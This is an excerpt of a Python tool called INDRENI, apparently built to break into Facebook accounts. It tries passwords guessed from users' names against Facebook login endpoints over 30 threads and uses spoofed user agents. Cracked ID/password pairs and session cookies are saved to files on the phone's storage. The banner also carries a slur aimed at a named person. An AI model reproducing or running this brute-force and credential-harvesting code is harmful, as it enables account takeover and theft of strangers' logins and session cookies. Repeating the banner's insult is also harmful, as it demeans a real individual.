...
from concurrent.futures import ThreadPoolExecutor as sarfrazINDRENI
from string import * 
...
def randBuildLSB():
    ...
    ua = f'Mozilla/5.0 (<system-information>) <platform> (<platform-details>) <extensions>'+END
    return ua
...
sys.stdout.write('\x1b]2; INDRENI\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo =                                          """            
 \033[1;31m_____ _   _ _____  _____  ______ _   _ _____ 
 \033[1;31m|_   _| \ | |  __ \|  __ \|  ____| \ | |_   _|
 \033[1;33m  | | |  \| | |  | | |__) | |__  |  \| | | |  
 \033[1;32m   | | | . ` | |  | |  _  /|  __| | . ` | | |  
 \033[1;34m _| |_| |\  | |__| | | \ \| |____| |\  |_| |_ 
 \033[1;35m|_____|_| \_|_____/|_|  \_\______|_| \_|_____|
\033[1;36m------------------------------------------------
\033[1;32m Owner   :             Aditya
\033[1;33m Version :             2.2
\033[1;34m Inspired by :       Lade Pun
\033[1;36m Description:       Hitesh is gay
\033[1;35m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to go back to INDRENI Menu ")
        exit()
...
def sarfraz():   
    ...
    if select =='1':
        ...
        os.system('xdg-open https://www.facebook.com/Doraemon.pun.9?mibextid=ZbWKwL')
    elif select =='3':
       exit()
    else:
        print('\n Select valid option ... ')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[INDRENI] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://www.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);INDRENIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={INDRENIb};{ckkk}"
                    print(f"\r{R} [INDRENI-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/INDRENI_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/INDRENI_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'a.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [INDRENI-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/INDRENI_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[INDRENI] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [INDRENI-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/INDRENI_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/INDRENI_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'a.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [INDRENI-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[INDRENI] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[INDRENI] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [INDRENI-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/INDRENI_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazINDRENI(max_workers=30) as INDRENIworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                INDRENIworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                INDRENIworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                INDRENIworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                INDRENIworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
